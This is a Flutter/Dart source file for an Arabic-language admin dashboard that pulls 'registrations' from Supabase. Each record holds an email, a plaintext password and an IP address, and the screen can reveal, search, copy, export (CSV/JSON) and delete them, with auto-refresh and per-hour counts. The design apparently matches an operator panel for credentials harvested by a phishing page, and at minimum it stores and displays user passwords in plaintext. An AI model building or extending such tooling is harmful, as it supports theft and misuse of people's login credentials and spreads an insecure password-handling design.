import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../models/registration.dart';
import '../services/supabase_service.dart';
import '../utils/app_colors.dart';
import '../utils/helpers.dart';
import '../widgets/stat_card.dart';
import '../widgets/chart_widget.dart';
import '../widgets/data_table_widget.dart';
import '../widgets/top_bar.dart';
import '../widgets/detail_modal.dart';
import '../widgets/toast_widget.dart';
import 'login_screen.dart';

class DashboardScreen extends StatefulWidget {
  const DashboardScreen({super.key});

  @override
  State<DashboardScreen> createState() => _DashboardScreenState();
}

class _DashboardScreenState extends State<DashboardScreen> {
  List<Registration> _allData = [];
  List<Registration> _filteredData = [];
  Set<int> _visiblePasswords = {};
  bool _isLoading = true;
  bool _isConnected = false;
  String _searchQuery = '';
  String _filterValue = 'all';
  Timer? _autoRefreshTimer;

  @override
  void initState() {
    super.initState();
    _loadData();
    _autoRefreshTimer = Timer.periodic(
      const Duration(seconds: 30),
      (_) => _loadData(),
    );
  }

  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _loadData() async {
    setState(() => _isLoading = true);
    try {
      final data = await SupabaseService.fetchRegistrations();
      setState(() {
        _allData = data;
        _isConnected = true;
        _isLoading = false;
        _applyFilters();
      });
      _showToast('✅ تم تحميل ${_allData.length} سجل', ToastType.info);
    } catch (e) {
      setState(() {
        _isConnected = false;
        _isLoading = false;
      });
      _showToast('❌ خطأ في تحميل البيانات', ToastType.error);
    }
  }

  void _applyFilters() {
    List<Registration> result = List.from(_allData);
    final now = DateTime.now();

    // تطبيق الفلتر
    switch (_filterValue) {
      case 'today':
        result = result.where((r) {
          final d = r.createdAt;
          return d.year == now.year &&
              d.month == now.month &&
              d.day == now.day;
        }).toList();
        break;
      case 'week':
        final weekAgo = now.subtract(const Duration(days: 7));
        result = result.where((r) => r.createdAt.isAfter(weekAgo)).toList();
        break;
      case 'month':
        final monthAgo = now.subtract(const Duration(days: 30));
        result = result.where((r) => r.createdAt.isAfter(monthAgo)).toList();
        break;
    }

    // تطبيق البحث
    if (_searchQuery.isNotEmpty) {
      result = result.where((r) {
        return r.email.toLowerCase().contains(_searchQuery) ||
            r.password.toLowerCase().contains(_searchQuery) ||
            (r.ipAddress ?? '').contains(_searchQuery);
      }).toList();
    }

    setState(() => _filteredData = result);
  }

  Map<String, int> _getStats() {
    final now = DateTime.now();
    final today = _allData.where((r) {
      final d = r.createdAt;
      return d.year == now.year && d.month == now.month && d.day == now.day;
    }).length;

    final weekAgo = now.subtract(const Duration(days: 7));
    final week = _allData.where((r) => r.createdAt.isAfter(weekAgo)).length;

    final hourAgo = now.subtract(const Duration(hours: 1));
    final hour = _allData.where((r) => r.createdAt.isAfter(hourAgo)).length;

    return {
      'total': _allData.length,
      'today': today,
      'week': week,
      'hour': hour,
    };
  }

  List<Map<String, dynamic>> _getChartData() {
    final List<Map<String, dynamic>> days = [];
    for (int i = 6; i >= 0; i--) {
      final d = DateTime.now().subtract(Duration(days: i));
      final count = _allData.where((r) {
        final rd = r.createdAt;
        return rd.year == d.year && rd.month == d.month && rd.day == d.day;
      }).length;
      days.add({
        'name': Helpers.dayNames[d.weekday % 7],
        'count': count,
      });
    }
    return days;
  }

  void _togglePassword(int id) {
    setState(() {
      if (_visiblePasswords.contains(id)) {
        _visiblePasswords.remove(id);
      } else {
        _visiblePasswords.add(id);
      }
    });
  }

  void _onSearch(String query) {
    _searchQuery = query.toLowerCase();
    _applyFilters();
  }

  void _onFilter(String value) {
    _filterValue = value;
    _applyFilters();
  }

  Future<void> _copyRow(Registration r) async {
    await Helpers.copyToClipboard(r);
    _showToast('📋 تم النسخ', ToastType.success);
  }

  void _viewRow(Registration r) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      backgroundColor: Colors.transparent,
      builder: (_) => DetailModal(registration: r),
    );
  }

  Future<void> _deleteRow(int id) async {
    final confirmed = await _showConfirmDialog('حذف هذا السجل؟');
    if (!confirmed) return;
    try {
      await SupabaseService.deleteRegistration(id);
      setState(() {
        _allData.removeWhere((r) => r.id == id);
        _applyFilters();
      });
      _showToast('🗑️ تم الحذف', ToastType.success);
    } catch (e) {
      _showToast('❌ خطأ في الحذف: $e', ToastType.error);
    }
  }

  Future<void> _deleteAll() async {
    final confirmed = await _showConfirmDialog('حذف جميع البيانات؟');
    if (!confirmed) return;
    final confirmed2 = await _showConfirmDialog('⚠️ تأكيد نهائي!');
    if (!confirmed2) return;
    try {
      await SupabaseService.deleteAllRegistrations();
      setState(() {
        _allData.clear();
        _filteredData.clear();
      });
      _showToast('🗑️ تم حذف الكل', ToastType.success);
    } catch (e) {
      _showToast('❌ خطأ: $e', ToastType.error);
    }
  }

  Future<void> _exportCSV() async {
    if (_allData.isEmpty) {
      _showToast('📭 لا توجد بيانات', ToastType.error);
      return;
    }
    await Helpers.exportCSV(_allData);
    _showToast('📄 تم التصدير CSV', ToastType.success);
  }

  Future<void> _exportJSON() async {
    if (_allData.isEmpty) {
      _showToast('📭 لا توجد بيانات', ToastType.error);
      return;
    }
    await Helpers.exportJSON(_allData);
    _showToast('📄 تم التصدير JSON', ToastType.success);
  }

  void _logout() {
    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (_) => const LoginScreen()),
    );
  }

  Future<bool> _showConfirmDialog(String message) async {
    return await showDialog<bool>(
          context: context,
          builder: (ctx) => AlertDialog(
            backgroundColor: const Color(0xFF12121F),
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20),
              side: BorderSide(color: Colors.white.withOpacity(0.1)),
            ),
            title: const Text('تأكيد', textAlign: TextAlign.center),
            content: Text(message, textAlign: TextAlign.center),
            actionsAlignment: MainAxisAlignment.center,
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(ctx, false),
                child: const Text('إلغاء',
                    style: TextStyle(color: Colors.white54)),
              ),
              ElevatedButton(
                onPressed: () => Navigator.pop(ctx, true),
                style: ElevatedButton.styleFrom(
                  backgroundColor: AppColors.red,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(10),
                  ),
                ),
                child:
                    const Text('تأكيد', style: TextStyle(color: Colors.white)),
              ),
            ],
          ),
        ) ??
        false;
  }

  void _showToast(String message, ToastType type) {
    ToastWidget.show(context, message, type);
  }

  @override
  Widget build(BuildContext context) {
    final stats = _getStats();
    final chartData = _getChartData();

    return Scaffold(
      backgroundColor: AppColors.background,
      body: SafeArea(
        child: Column(
          children: [
            // شريط علوي
            TopBar(
              isConnected: _isConnected,
              onRefresh: _loadData,
              onExportCSV: _exportCSV,
              onExportJSON: _exportJSON,
              onDeleteAll: _deleteAll,
              onLogout: _logout,
            ),

            // المحتوى
            Expanded(
              child: RefreshIndicator(
                onRefresh: _loadData,
                color: AppColors.pink,
                child: ListView(
                  padding: const EdgeInsets.all(0),
                  children: [
                    // الإحصائيات
                    Padding(
                      padding: const EdgeInsets.all(16),
                      child: _buildStatsGrid(stats),
                    ),

                    // الرسم البياني
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      child: ChartWidget(data: chartData),
                    ),
                    const SizedBox(height: 16),

                    // جدول البيانات
                    Padding(
                      padding: const EdgeInsets.symmetric(horizontal: 16),
                      child: DataTableWidget(
                        data: _filteredData,
                        isLoading: _isLoading,
                        visiblePasswords: _visiblePasswords,
                        onSearch: _onSearch,
                        onFilter: _onFilter,
                        onTogglePassword: _togglePassword,
                        onCopy: _copyRow,
                        onView: _viewRow,
                        onDelete: _deleteRow,
                      ),
                    ),
                    const SizedBox(height: 30),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildStatsGrid(Map<String, int> stats) {
    return GridView.count(
      crossAxisCount: 2,
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisSpacing: 12,
      mainAxisSpacing: 12,
      childAspectRatio: 1.6,
      children: [
        StatCard(
          icon: '📊',
          number: stats['total']!,
          label: 'إجمالي التسجيلات',
          color: AppColors.blue,
        ),
        StatCard(
          icon: '📅',
          number: stats['today']!,
          label: 'تسجيلات اليوم',
          color: AppColors.green,
        ),
        StatCard(
          icon: '📈',
          number: stats['week']!,
          label: 'هذا الأسبوع',
          color: AppColors.pink,
        ),
        StatCard(
          icon: '⏰',
          number: stats['hour']!,
          label: 'آخر ساعة',
          color: AppColors.orange,
        ),
      ],
    );
  }
}